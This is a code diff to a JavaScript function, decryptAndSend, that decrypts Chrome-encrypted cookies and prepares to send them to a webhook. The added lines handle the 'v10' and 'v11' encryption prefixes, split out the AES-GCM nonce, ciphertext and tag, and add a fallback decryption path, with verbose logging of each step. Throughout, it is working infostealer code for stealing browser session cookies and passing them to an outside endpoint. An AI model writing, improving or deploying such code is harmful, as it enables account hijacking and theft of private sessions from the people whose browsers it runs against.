@@ -52,14 +52,31 @@ async function decryptAndSend(encryptedHex, keyB64, webhook) {
         console.log('[API] Encrypted data info:', { 
             totalBytes: encryptedBytes.length,
             firstFewBytes: Array.from(encryptedBytes.slice(0, 10)),
-            prefix: Array.from(encryptedBytes.slice(0, 3))
+            prefix: Array.from(encryptedBytes.slice(0, 3)),
+            prefixStr: String.fromCharCode(...encryptedBytes.slice(0, 3))
         });
         
-        // Skip first 3 bytes (v10/v11/v20 prefix)
-        const nonce = encryptedBytes.slice(3, 15); // 12 bytes
+        // Check for different encryption versions
+        const prefix = encryptedBytes.slice(0, 3);
+        const prefixStr = String.fromCharCode(...prefix);
+        console.log('[API] Encryption prefix detected:', prefixStr);
         
-        // Extract ciphertext and tag
-        const ciphertextTag = encryptedBytes.slice(15);
+        let nonce, ciphertextTag;
+        if (prefixStr === 'v10') {
+            // Chrome v80+
+            nonce = encryptedBytes.slice(3, 15); // 12 bytes
+            ciphertextTag = encryptedBytes.slice(15);
+        } else if (prefixStr === 'v11') {
+            // Chrome v88+
+            nonce = encryptedBytes.slice(3, 15); // 12 bytes  
+            ciphertextTag = encryptedBytes.slice(15);
+        } else {
+            // Fallback - try standard format
+            console.log('[API] Unknown prefix, trying standard format');
+            nonce = encryptedBytes.slice(3, 15); // 12 bytes
+            ciphertextTag = encryptedBytes.slice(15);
+        }
+        
         const ciphertext = ciphertextTag.slice(0, ciphertextTag.length - 16);
         const tag = ciphertextTag.slice(ciphertextTag.length - 16);
         
@@ -89,16 +106,41 @@ async function decryptAndSend(encryptedHex, keyB64, webhook) {
         
         console.log('[API] Key imported, starting decryption...');
         
-        // Decrypt
-        const plaintext = await crypto.subtle.decrypt(
-            { name: 'AES-GCM', iv: nonce, tagLength: 128 },
-            cryptoKey,
-            new Uint8Array([...ciphertext, ...tag])
-        );
-        
-        console.log('[API] Decryption completed, decoding text...');
-        const cookie = new TextDecoder().decode(plaintext).replace(/\0/g, '').trim();
-        console.log('[API] Decryption successful! Cookie length:', cookie.length);
+        let cookie;
+        try {
+            // First attempt: Standard AES-GCM
+            const plaintext = await crypto.subtle.decrypt(
+                { name: 'AES-GCM', iv: nonce, tagLength: 128 },
+                cryptoKey,
+                new Uint8Array([...ciphertext, ...tag])
+            );
+            
+            console.log('[API] Decryption completed, decoding text...');
+            cookie = new TextDecoder().decode(plaintext).replace(/\0/g, '').trim();
+            console.log('[API] Decryption successful! Cookie length:', cookie.length);
+            
+        } catch (firstError) {
+            console.log('[API] First decryption attempt failed, trying alternative format...');
+            
+            // Second attempt: Try without separating tag
+            try {
+                const plaintext2 = await crypto.subtle.decrypt(
+                    { name: 'AES-GCM', iv: nonce },
+                    cryptoKey,
+                    ciphertextTag
+                );
+                
+                console.log('[API] Alternative decryption successful!');
+                cookie = new TextDecoder().decode(plaintext2).replace(/\0/g, '').trim();
+                console.log('[API] Cookie length:', cookie.length);
+                
+            } catch (secondError) {
+                console.log('[API] Both decryption methods failed');
+                console.error('[API] First error:', firstError);
+                console.error('[API] Second error:', secondError);
+                throw new Error(`Decryption failed: ${firstError.message} / ${secondError.message}`);
+            }
+        }
         
         // Send to webhook
         const decodedWebhook = decodeURIComponent(webhook);
